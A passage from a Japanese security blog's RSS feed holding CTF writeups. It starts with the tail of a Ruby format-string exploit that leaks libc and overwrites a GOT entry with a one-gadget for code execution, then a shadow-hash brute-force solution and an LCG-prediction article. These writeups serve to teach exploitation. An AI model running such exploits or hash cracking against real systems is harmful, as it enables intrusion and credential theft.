data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gsub(&lt;span style=&#34;color:#b68&#34;&gt;/\s/&lt;/span&gt;,&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
libc_start_main &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/BBB(.*)@@\./&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;chop&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;240&lt;/span&gt;
libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_start_main &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;__libc_start_main&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc base address = &lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;libc_base&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;

one_gadget &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xf02a4&lt;/span&gt;
high &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (one_gadget &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffffffff00000000&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;32&lt;/span&gt;
low &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; one_gadget &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffffffff&lt;/span&gt;
llow &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (low &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffff0000&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;
hlow &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; low &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffff&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Overwriting __stack_chk_fail@got to one gadget RCE&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;high&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x2c\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;hlow&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x28\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;llow&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x2a\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#800&#34;&gt;STDIN&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gets
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4892c%11$hnAAAABBB%17$p&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>VolgaCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/volga2019/</link>
      <pubDate>Wed, 03 Apr 2019 08:07:43 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/volga2019/</guid>
      <description>

&lt;h2 id=&#34;shadow-cat&#34;&gt;Shadow cat&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;と&lt;code&gt;encrypted.txt&lt;/code&gt;が渡される&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;には、1文字のユーザ名とその暗号化されたパスワードなどが乗っており、&lt;code&gt;encrypted.txt&lt;/code&gt;にはその1文字で構成される文字列が含まれており、単一替え字暗号だとわかる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;のパスワードを総当たりで解き、得れた替え字表を使って置換するコードを書いて実行したらFLAG&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;unix_crypt&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# gem install unix-crypt&lt;/span&gt;
org &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[]&lt;/span&gt;
ans &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[]&lt;/span&gt;
lines &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./shadow.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
lines&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;line&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
  org &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
  enc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
  salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;$&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
  
  &lt;span style=&#34;color:#666&#34;&gt;0x1f&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;upto(&lt;span style=&#34;color:#666&#34;&gt;0x7e&lt;/span&gt;) &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
    hashpass &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;UnixCrypt&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;SHA512&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;build(i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr, salt)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; hashpass &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; enc
      ans &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr
      &lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Passed&amp;#34;&lt;/span&gt;
      &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
  &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;

encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./encrypted.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chomp
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;VolgaCTF{&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;encrypted&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;tr(org&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;), ans&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;))&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;}&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>線形合同法で生成される乱数値を予測する</title>
      <link>https://owlinux1000.github.io/blog/post/predict_lcg/</link>
      <pubDate>Mon, 01 Apr 2019 22:33:26 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/predict_lcg/</guid>
      <description>

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;線形合同法（LCG）とは、至極一般的かつ簡易に実装することができる乱数生成手法の1つです。先日行われたVolgaCTF 2019では、この線形合同法により生成される乱数値を予測する問題（問題名LG）が出題されました。本問題ではx0 ~ x6に相当する6つの乱数が表示され、それを元に次の値を算出する問題です。&lt;/p&gt;

&lt;h2 id=&#34;線形合同法&#34;&gt;線形合同法&lt;/h2&gt;

&lt;p&gt;線形合同法は、以下の式で定義されます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;x1 = (a * x0 + c) % p&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このとき、x0は乱数のseed値、a, c, pがパラメータとなり適切な値を選びます。今回の問題では、x0 ~ x6までの値が与えられ、その次の値を入力するといったものでした。「a, c, pがわからないと無理じゃない？ｗ」と思ってしまったのですが、どうやら行列演算することで「a, c, p」を算出可能らしいです。&lt;/p&gt;

&lt;h2 id=&#34;線形合同法のパラメータの算出&#34;&gt;線形合同法のパラメータの算出&lt;/h2&gt;

&lt;p&gt;まずはじめに、各種x0 ~ x6を用いて以下の4つの行列を作成します。それらの行列式を用いて、各行列式の最大公約数(GCD)を算出します。これが、「p」に相当します。その後、(x3 - x4) と(x2 - x3)の法pにおける逆元を乗算し、再度pで割ると「a」になります。最後に、&lt;code&gt;(x4 - a * x3) % p&lt;/code&gt;で割った際の剰余がcになる。以上の計算を行うコードを以下に示す。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#coding: utf-8&lt;/span&gt;

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;math&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;numpy&lt;/span&gt; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;np&lt;/span&gt;

x0 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;64302589647963933737451564&lt;/span&gt;
x1 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;23099347408308738343740115&lt;/span&gt;
x2 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;60779187967701597680605077&lt;/span&gt;
x3 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;41531243105709646792416331&lt;/span&gt;
x4 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;71461317334046189800115379&lt;/span&gt;
x5 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;50094315434186546595562390&lt;/span&gt;
x6 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;27719142972686291997765807&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# なんかnp.linalg.detがエラー吐くので作成&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;det&lt;/span&gt;(matrix):
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; matrix[&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; matrix[&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; matrix[&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; matrix[&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;]

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;egcd&lt;/span&gt;(a, b):
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;:
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; (b, &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt;:
        g, y, x &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; egcd(b &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; a, a)
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; (g, x &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; (b &lt;span style=&#34;color:#666&#34;&gt;//&lt;/span&gt; a) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; y, y)
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;modinv&lt;/span&gt;(a, m):
    g, x, y &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; egcd(a, m)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; g &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;:
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#d2413a;font-weight:bold&#34;&gt;Exception&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;modular inverse does not exist&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; x &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; m

matrix0 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;array([
    [x1 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x2 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1],
    [x2 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1]
])

matrix1 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;array([
    [x2 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1],
    [x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1]
])

matrix2 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;array([
    [x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1],
    [x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x5 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1]
])

matrix3 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;array([
    [x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x5 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1],
    [x5 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x6 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1]
])

p0 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; math&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gcd(det(matrix0), det(matrix1))
p1 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; math&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gcd(p0, det(matrix2))
p &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; math&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gcd(p1, det(matrix3))

a &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ((x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x4) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; modinv(x2 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x3, p)) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p
c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x3) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x1 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x0 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x2 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x1 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x3 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x2 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x4 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x3 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x5 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x4 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x6 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x5 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt;((a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x6 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#=&amp;gt; 54571278391299526410540376&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;本記事では、線形合同法における乱数値の予測方法についてまとめた。パラメータが不明な場合でも本手法を用いることで解読なので覚えておきたい。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>PragyanCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/pragyan2019/</link>
      <pubDate>Sun, 10 Mar 2019 22:48:37 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/pragyan2019/</guid>
      <description>

&lt;h2 id=&#34;welcome&#34;&gt;Welcome&lt;/h2&gt;

&lt;ul&gt;
